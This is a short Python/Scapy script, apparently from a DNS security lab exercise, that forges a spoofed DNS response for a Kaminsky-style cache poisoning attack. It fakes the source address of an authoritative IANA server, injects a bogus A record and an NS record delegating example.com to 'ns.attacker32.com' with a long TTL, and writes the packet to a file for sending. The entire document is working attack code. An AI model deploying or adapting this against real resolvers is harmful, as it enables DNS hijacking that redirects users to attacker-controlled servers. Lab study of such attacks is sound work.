from scapy.all import *

# Get the legitimate DNS response first
# dig +short NS example.com
# dig b.iana-servers.net. A

name = "twysw.example.com"
domain = "example.com"
ns = "ns.attacker32.com"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
            qdcount=1, ancount=1, nscount=1, arcount=0,
            qd=Qdsec, an=Anssec, ns=NSsec)

ip = IP(dst='10.9.0.153', src="199.43.133.53")
udp = UDP(dport=53, sport=33333, chksum=0)
reply = ip/udp/dns

#send(reply)
with open("ip_resp.bin", "wb") as f:
    f.write(bytes(reply))
    reply.show()    